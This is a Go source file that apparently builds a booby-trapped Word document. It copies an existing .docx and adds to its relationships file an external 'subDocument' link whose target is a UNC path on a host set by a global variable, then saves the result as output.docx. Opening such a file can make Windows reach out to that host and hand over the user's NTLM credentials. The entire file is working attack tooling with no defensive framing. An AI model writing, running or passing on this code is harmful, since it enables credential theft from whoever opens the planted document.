package ooxml

import (
	"archive/zip"
	"encoding/xml"
	"fmt"
	"io"
	"log"
	"os"
	"sort"
	"strconv"
)

// Appends file and data to a new zip file
func appendToZip(zipName string, zipData []byte) {
	ZipArray.Files = append(ZipArray.Files, ZipFile{
		Name:     zipName,
		Contents: zipData,
	})
}

// Marshals the XML data with the XML Prolog
func marshalWithHeader(v interface{}) ([]byte, error) {
	parsed, err := xml.Marshal(v)
	if err != nil {
		return nil, err
	}
	parsed = []byte(Header + string(parsed))

	return parsed, nil
}

func Initialize(fileName string) error {
	log.Println("Opening document...")

	r, err := zip.OpenReader(fileName)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {
		rc, err := f.Open()
		if err != nil {
			return err
		}

		zipData, err := io.ReadAll(rc)
		if err != nil {
			return err
		}
		rc.Close()

		if err = EditPackage(f, zipData); err != nil {
			return err
		}
	}

	if err = WritePackage("output.docx"); err != nil {
		return err
	}

	return nil
}

func EditPackage(zipFile *zip.File, zipData []byte) error {
	switch zipFile.Name {
	case CDocumentXMLRels:
		rs := Relationships{}
		if err := xml.Unmarshal(zipData, &rs); err != nil {
			return err
		}

		var idList []int
		for _, rel := range rs.Relationships {
			out, err := strconv.Atoi(rel.Id[len(rel.Id)-1:])
			if err != nil {
				return err
			}

			idList = append(idList, out)
		}
		sort.Ints(idList)
		targetId := idList[len(idList)-1] + 1

		rs.Relationships = append(rs.Relationships, Relation{
			Id:         fmt.Sprintf("rId%d", targetId),
			Type:       "http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument",
			Target:     fmt.Sprintf("file:///\\\\%s\\doc\\", GlobalVar.Target),
			TargetMode: "External",
		})

		rsParsed, err := marshalWithHeader(rs)
		if err != nil {
			return err
		}

		appendToZip(zipFile.Name, rsParsed)

	case CDocument:
		appendToZip(zipFile.Name, zipData)
	case CStyles:
		appendToZip(zipFile.Name, zipData)
	default:
		// Append all other
		appendToZip(zipFile.Name, zipData)
	}

	return nil
}

func WritePackage(fileName string) error {
	f, err := os.Create(fileName)
	if err != nil {
		return err
	}
	defer f.Close()

	w := zip.NewWriter(f)

	for _, file := range ZipArray.Files {
		log.Printf("%s", file.Name)

		zf, err := w.Create(file.Name)
		if err != nil {
			return err
		}

		if _, err = zf.Write([]byte(file.Contents)); err != nil {
			return err
		}
	}

	err = w.Close()
	if err != nil {
		return err
	}

	return nil
}
